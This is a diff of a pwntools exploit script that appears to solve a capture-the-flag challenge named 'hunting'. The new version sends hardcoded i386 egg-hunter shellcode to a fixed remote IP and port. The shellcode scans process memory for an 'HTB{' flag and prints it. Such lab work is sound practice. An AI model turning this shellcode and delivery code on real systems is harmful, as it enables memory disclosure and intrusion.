@@ -1,66 +1,23 @@
-#!/bin/python3
-
-from pwn import * 
-
-context.clear(arch="i386")
-context.terminal = ["terminator", "-e"]
+from pwn import *
 
 
-HOST = ""
-PORT = 0
+context.arch = "i386"
 
-sh = process("/home/luis/Documents/tests/hunting/h")
-#sh = process("./hunting")
-#sh = remote(HOST, PORT)
+shell_code = b"\x6a\x1b\x58\x6a\x7f\x5b\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x8d\x1a\xb0\x21\x31\xc9\xcd\x80\x3c\xf2\x61\x74\xec\x39\x3a\x75\xed\x6a\x04\x58\x31\xdb\xfe\xc3\x89\xd1\x6a\x24\x5a\xcd\x80\xeb\xc6"
 
-def com(payload):
-    global sh
-    log.progress("Sending payload...")
-    sh.sendline(payload)
-    log.success("SENT!")
-    data = sh.recv()
-    log.success("Received the response")
-    return data
 
-lowest_addr = 0x60000000
-highest_addr= 0x80000000
-incrementor = 0x10000
+log.info("Connecting to remote host")
 
-# might need to clean registers
-# xor eax, eax
-# xor ebx, ebx
+(host, port ) = ("139.59.178.146", 31505)
 
-# alarm(99)
-payload =  asm("""
-    xor eax, eax
-    mov eax, 0x1b 
-    mov ebx, 0x63
-    int 0x80
-    """)
+sock = remote(host, port)
 
-# read(0, esp, 500) - reads from stdin and store in the stack
-# payload += asm("""
-#     xor eax, eax
-#     mov eax, 0x3
-#     mov ebx, 0x0
-#     mov ecx, [esp+4]
-#     mov edx, 0x1f4
-#     int 0x80
-#     """)
+log.progress("Sending shellcode....")
+sock.sendline(shell_code)
 
-# payload += asm("""
-#     jnz
-#     """)
+log.info("Waiting response...")
+resp = sock.recvuntil(b"}")
 
-payload = asm("""
-    xor eax, eax
-    mov al, 0x1
-    xor ebx, ebx
-    int 0x80
-    """)
+log.success("Here you have: {}".format(resp))
 
-log.progress("Sending initial payload...")
-print(payload)
-# for addr in range(lowest_addr, highest_addr, incrementor):
-#     pass    
-
+sock.close()
